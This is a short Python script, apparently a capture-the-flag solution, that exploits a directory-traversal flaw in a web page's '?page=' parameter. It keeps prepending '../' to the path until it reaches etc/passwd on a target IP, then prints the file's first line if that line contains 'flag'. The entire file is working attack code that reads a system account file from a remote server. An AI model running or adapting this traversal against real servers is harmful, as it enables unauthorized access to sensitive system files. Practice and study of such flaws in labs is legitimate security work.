import urllib
from sys import argv

PATH = "etc/passwd"

def crawl(ip):
	f = urllib.urlopen(ip + PATH)
	html = f.read()
	string = html.split('\n', 1)[0]
	if string.count("flag"):
		print(string)
		exit()
	crawl(ip + "../")

def main(ip):
	url = "http://" + ip + "/?page=../"
	crawl(url)

if __name__ == "__main__":
	try:
		ip = argv[1]
		main(ip)
	except IndexError:
		print("Error: No ip (ex: python crawler.py 192.168.255.129)")